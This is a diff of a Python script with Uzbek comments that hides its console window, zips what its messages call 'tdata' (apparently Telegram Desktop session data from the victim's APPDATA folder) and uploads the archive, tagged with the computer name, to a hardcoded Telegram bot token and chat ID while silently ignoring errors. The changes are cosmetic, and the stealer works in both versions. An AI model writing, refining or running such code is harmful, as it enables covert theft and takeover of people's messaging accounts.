@@ -6,15 +6,13 @@ import socket
 import tempfile
 import time
 
-# Qora oynani yashirish uchun kod
+# Qora oynani yashirish
 if os.name == 'nt':
     import ctypes
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# 1. Telegram Bot Tokeni
+# Ma'lumotlar (Token va ID)
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
-
-# 2. Chat ID
 CHAT_ID = 7080045924
 
 # --- Yordamchi funksiyalar ---
@@ -30,9 +28,7 @@ def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(file_path, 'rb') as f:
-            files = {'document': f}
-            data = {'chat_id': CHAT_ID, 'caption': caption}
-            requests.post(url, files=files, data=data)
+            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
     except:
         pass
 
@@ -47,7 +43,7 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
-# --- Asosiy ishchi funksiya ---
+# --- Asosiy ish ---
 def main():
     pc_name = socket.gethostname()
     appdata = os.getenv('APPDATA')
@@ -69,7 +65,7 @@ def main():
             if file_size_mb < 49:
                 send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 Kompyuter: `{pc_name}`\n📦 Hajmi: {file_size_mb:.2f} MB")
             else:
-                send_telegram_message(f"⚠️ tdata juda katta ({file_size_mb:.2f} MB), 50 MB dan oshib ketdi!")
+                send_telegram_message(f"⚠️ tdata juda katta ({file_size_mb:.2f} MB)")
             
             os.remove(zip_path)
         except Exception as e:
